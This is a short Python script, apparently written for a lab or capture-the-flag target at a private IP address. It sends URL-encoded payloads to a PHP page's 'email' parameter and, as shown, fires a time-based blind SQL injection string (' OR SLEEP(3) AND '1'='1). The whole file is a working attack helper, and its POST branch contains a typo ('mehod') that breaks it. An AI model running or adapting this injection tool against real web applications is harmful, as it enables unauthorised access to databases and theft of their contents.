#!/usr/bin/env python3

import requests
from urllib.parse import quote_plus


class Blind():
	def __init__(self, url='http://10.102.10.42/regards.php?email='):
		self.url = url

	def send(self, payload, method='GET'):
		payload = quote_plus(payload)
		if method == 'GET':
			r = requests.get(self.url + payload)
		elif mehod == 'POST':
			r = requests.post(self.url, data=payload)

		r.raise_for_status()

		if r.status_code == 200:
			return r.text
		else:
			return r.status_code, r.reason


if __name__ == '__main__':
	b = Blind()
	r = b.send("' OR SLEEP(3) AND '1'='1")
	print(r)
